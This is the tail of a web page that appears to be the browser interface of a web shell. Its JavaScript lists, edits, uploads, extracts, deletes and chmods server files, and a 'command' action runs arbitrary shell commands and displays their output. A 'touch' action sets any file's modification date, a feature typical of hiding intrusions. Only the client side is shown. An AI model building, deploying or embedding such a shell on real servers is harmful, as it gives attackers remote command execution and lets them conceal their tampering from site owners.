        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        async function ajaxRequest(action, data = {}) {
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', action);
            
            for (let key in data) {
                formData.append(key, data[key]);
            }

            try {
                const response = await fetch('', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (!result.success && result.error) {
                    showError(result.error);
                }
                return result;
            } catch (error) {
                showError('Network error: ' + error.message);
                return { success: false, error: 'Network error' };
            }
        }

        async function loadDirectory() {
            if (isLoading) return;
            isLoading = true;
            
            const result = await ajaxRequest('list');
            if (result.success && result.data) {
                renderBreadcrumb(result.data.breadcrumb);
                renderFileList(result.data.items);
                if (result.data.error) {
                    showError(result.data.error);
                }
            }
            isLoading = false;
        }

        function renderBreadcrumb(breadcrumb) {
            const container = document.getElementById('breadcrumb-container');
            let html = '';
            html += `<span class="crumb-item" onclick="goHome()">🏠 HOME</span>`;
            html += ' <span style="color: #00ffaa;">/</span> ';
            for (let i = 0; i < breadcrumb.length; i++) {
                const crumb = breadcrumb[i];
                const safePath = crumb.path.replace(/'/g, "\\'");
                html += `<span class="crumb-item" onclick="navigateTo('${safePath}')">${escapeHtml(crumb.name)}</span>`;
                if (i < breadcrumb.length - 1) {
                    html += ' <span style="color: #00ffaa;">/</span> ';
                }
            }
            container.innerHTML = html;
        }

        function renderFileList(items) {
            const tbody = document.getElementById('file-list-body');
            let html = '';
            
            if (!items || items.length === 0) {
                html = '<tr><td colspan="6" style="text-align: center; padding: 20px;">📂 Empty directory</td></tr>';
            } else {
                for (let item of items) {
                    const nameClass = item.is_dir ? 'dir-item' : 'file-item';
                    const icon = item.is_dir ? '📁' : '📄';
                    const nameHtml = item.is_dir 
                        ? `<span class="${nameClass}" onclick="navigateToDir('${escapeHtml(item.name).replace(/'/g, "\\'")}')">${icon} ${escapeHtml(item.name)}</span>`
                        : `<span class="${nameClass}" onclick="editFile('${escapeHtml(item.name).replace(/'/g, "\\'")}')">${icon} ${escapeHtml(item.name)}</span>`;
                    
                    html += '<tr>';
                    html += `<td>${nameHtml}</td>`;
                    html += `<td class="size">${escapeHtml(item.size)}</td>`;
                    html += `<td class="perms ${item.perm_class}">${escapeHtml(item.perms)}</td>`;
                    html += `<td class="owner">${escapeHtml(item.owner)}</td>`;
                    html += `<td class="date">${escapeHtml(item.modified)}</td>`;
                    html += `<td class="actions">`;
                    
                    if (!item.is_dir) {
                        html += `<span class="action-link" onclick="editFile('${escapeHtml(item.name).replace(/'/g, "\\'")}')">✎ EDIT</span>`;
                    }
                    html += `<span class="action-link" onclick="renameItem('${escapeHtml(item.name).replace(/'/g, "\\'")}')">✏ RENAME</span>`;
                    html += `<span class="action-link delete" onclick="deleteItem('${escapeHtml(item.name).replace(/'/g, "\\'")}')">🗑 DEL</span>`;
                    html += `<span class="action-link" onclick="chmodItem('${escapeHtml(item.name).replace(/'/g, "\\'")}', '${item.perms}')">🔐 CHMOD</span>`;
                    html += `<span class="action-link" onclick="touchItem('${escapeHtml(item.name).replace(/'/g, "\\'")}')">📅 TOUCH</span>`;
                    
                    html += `</td>`;
                    html += '</tr>';
                }
            }
            
            tbody.innerHTML = html;
        }

        function goHome() {
            navigateTo(homePath);
        }

        async function navigateTo(path) {
            const result = await ajaxRequest('navigate', { path: path });
            if (result.success) {
                await loadDirectory();
            }
        }

        function navigateToDir(dirname) {
            navigateTo(dirname);
        }

        async function deleteItem(name) {
            if (confirm(`⚠️ Delete "${name}" permanently?`)) {
                const result = await ajaxRequest('delete', { target: name });
                if (result.success) {
                    await loadDirectory();
                }
            }
        }

        function renameItem(oldName) {
            const newName = prompt('Enter new name:', oldName);
            if (newName && newName !== oldName) {
                ajaxRequest('rename', { old: oldName, new: newName }).then(result => {
                    if (result.success) loadDirectory();
                });
            }
        }

        async function createFolder() {
            const name = document.getElementById('new-folder-name').value.trim();
            if (name) {
                const result = await ajaxRequest('newfolder', { name: name });
                if (result.success) {
                    document.getElementById('new-folder-name').value = '';
                    await loadDirectory();
                }
            }
        }

        async function createFile() {
            const name = document.getElementById('new-file-name').value.trim();
            if (name) {
                const result = await ajaxRequest('newfile', { name: name });
                if (result.success) {
                    document.getElementById('new-file-name').value = '';
                    await loadDirectory();
                }
            }
        }

        function uploadFile(input) {
            const file = input.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', 'upload');
            formData.append('file', file);

            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.success) {
                    loadDirectory();
                }
                input.value = '';
            });
        }

        function uploadAndExtract(input) {
            const file = input.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', 'upload_extract');
            formData.append('file', file);

            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.success) {
                    loadDirectory();
                }
                input.value = '';
            });
        }

        function chmodItem(name, currentPerms) {
            const newPerms = prompt('Enter permissions (e.g., 755, 644):', currentPerms);
            if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) {
                ajaxRequest('chmod', { target: name, perms: newPerms }).then(result => {
                    if (result.success) loadDirectory();
                });
            } else if (newPerms) {
                showError('Invalid permissions format. Use 3 or 4 digits (0-7)');
            }
        }

        function touchItem(name) {
            const date = prompt('Enter date (YYYY-MM-DD HH:MM:SS):', new Date().toISOString().slice(0, 19).replace('T', ' '));
            if (date) {
                ajaxRequest('touch', { target: name, date: date }).then(result => {
                    if (result.success) loadDirectory();
                });
            }
        }

        async function editFile(name) {
            const result = await ajaxRequest('edit', { target: name });
            if (result.success && result.data) {
                currentEditFile = name;
                document.getElementById('editor-content').value = result.data.content;
                document.getElementById('editor-overlay').style.display = 'flex';
            }
        }

        async function saveFile() {
            const content = document.getElementById('editor-content').value;
            const result = await ajaxRequest('save', { target: currentEditFile, content: content });
            if (result.success) {
                closeEditor();
                await loadDirectory();
            }
        }

        function closeEditor() {
            document.getElementById('editor-overlay').style.display = 'none';
            currentEditFile = '';
        }

        async function executeCommand() {
            const cmd = document.getElementById('terminal-cmd').value.trim();
            if (!cmd) return;
            
            document.getElementById('terminal-output').innerHTML = 'Executing...';
            const result = await ajaxRequest('command', { cmd: cmd });
            if (result.success && result.data) {
                document.getElementById('terminal-output').innerHTML = '<span style="color: #00ffaa;">$ ' + escapeHtml(cmd) + '</span><br>' + escapeHtml(result.data.output);
                document.getElementById('terminal-cmd').value = '';
            }
        }

        // Auto refresh every 30 seconds
        let refreshInterval = setInterval(loadDirectory, 30000);
        
        // Initial load
        loadDirectory();
        
        // Handle escape key for editor
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && document.getElementById('editor-overlay').style.display === 'flex') {
                closeEditor();
            }
        });
    </script>
</body>
</html>
